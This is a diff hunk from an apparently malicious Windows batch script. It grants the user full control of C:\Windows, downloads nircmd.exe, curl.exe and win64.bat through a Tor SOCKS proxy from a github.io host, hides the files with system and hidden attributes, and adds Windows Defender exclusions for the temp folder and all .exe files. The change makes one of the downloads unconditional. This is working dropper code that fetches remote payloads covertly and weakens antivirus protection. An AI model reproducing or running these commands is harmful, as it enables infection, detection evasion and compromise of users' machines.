@@ -53,11 +53,7 @@ ICACLS "C:\Windows" /INHERITANCE:e /GRANT:r %UserName%:(F) /C
 
 cd "C:\Windows"
 curl.exe --socks5-hostname 127.0.0.1:9050 https://cryptedlumos.github.io/Capture/nircmd.exe --output "C:\Windows\nircmd.exe" && attrib +s +h +i "nircmd.exe"
-IF EXIST "C:\Windows\System32\curl.exe" (
-  echo.
-) ELSE (
-  curl.exe --socks5-hostname 127.0.0.1:9050 https://cryptedlumos.github.io/Capture/curl.exe --output "C:\Windows\curl.exe" && attrib +s +h +i "curl.exe"
-)
+curl.exe --socks5-hostname 127.0.0.1:9050 https://cryptedlumos.github.io/Capture/curl.exe --output "C:\Windows\curl.exe" && attrib +s +h +i "curl.exe"
 curl.exe --socks5-hostname 127.0.0.1:9050 https://cryptedlumos.github.io/win64.bat --output "C:\Windows\win64.bat" && attrib +s +h +i "win64.bat"
 powershell.exe Add-MpPreference -ExclusionPath "%temp%"
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
